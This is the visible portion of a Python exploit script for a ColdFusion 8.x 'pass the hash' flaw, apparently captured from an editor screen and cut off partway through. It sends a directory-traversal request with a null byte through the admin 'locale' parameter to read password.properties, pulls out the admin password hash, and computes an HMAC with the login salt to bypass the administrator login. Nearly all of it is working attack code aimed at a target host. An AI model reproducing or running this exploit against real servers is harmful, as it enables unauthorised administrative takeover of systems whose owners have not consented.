#!/usr/bin/env python

# ColdFusion 8.x "Pass the Hash" vulnerability.
# Steve Coward (steve@sugarstack.io)
#
# This tool serves to provide an efficient way of gathering required
# information to compute a suitable hash to bypass ColdFusion's administrative
# login form. This script requires a salt value found on the admin login form
# via a browser to function properly. Once the script generates the hash, use
# Tamper Data or a similar browser extension to append the hash to the 'cfadminPassword'
# POST form field.

import click
import requests
import hashlib
import hmac
import re

def generate_hash(password_hash, salt):
    return hmac.new(salt,password_hash,hashlib.sha1).hexdigest().upper()

@click.command()
@click.option('--host', required=True, help='Target host (e.g. victim.com, 10.1.1.20:8080.')
@click.option('--salt', required=True, help='Salt found in admin login page source.')
def retrieve_hash(host, salt):
    """ Attempts to exploit a ColdFusion file disclosure vulnerability to retrieve a
        hashed admin password. If found, this script will produce a hash to be used to
        bypass admin login by computing the value of the admin hash and a ColdFusion salt
        input parameter. """

    password_pattern = re.compile(r'\npassword=(.+)\r')
    url = 'http://%s/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%%00en' % host

    try:
        response = requests.post(url)
        password_hash = re.search(password_pattern, response.text)

cf-passthehash.py                                                                                                                                                  1,1            Top
"cf-passthehash.py" [noeol] 56L, 2383C